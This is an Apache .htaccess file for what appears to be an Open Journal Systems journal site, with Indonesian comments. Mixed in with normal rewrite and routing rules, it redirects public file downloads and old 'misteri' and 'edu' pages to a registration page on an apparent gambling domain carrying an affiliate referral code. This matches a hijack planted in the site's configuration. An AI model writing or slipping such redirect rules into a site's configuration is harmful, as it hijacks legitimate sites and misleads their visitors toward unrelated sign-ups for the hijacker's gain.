Options -Indexes

<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    # === redirect untuk semua downloadPublic <ID> ===
    RewriteCond %{REQUEST_URI} ^/index.php/rkt/libraryFiles/downloadPublic/([0-9]+)$
    RewriteRule ^ https://nota4dkuning.live/register?ref=3UTAANT005N [R=302,L]

    # redirect folder misteri lama
    RewriteRule ^misteri/.*\.html$ https://nota4dkuning.live/register?ref=3UTAANT005N [R=301,L,QSA]

    # redirect folder edu lama
    RewriteRule ^edu/.*\.html$ https://nota4dkuning.live/register?ref=3UTAANT005N [R=301,L,QSA]

    # Authorization pass OJS
    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

    # Lewati file atau folder asli
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d

    # Arahkan semua request lain ke index.php
    RewriteRule ^ index.php [QSA,L]
</IfModule>
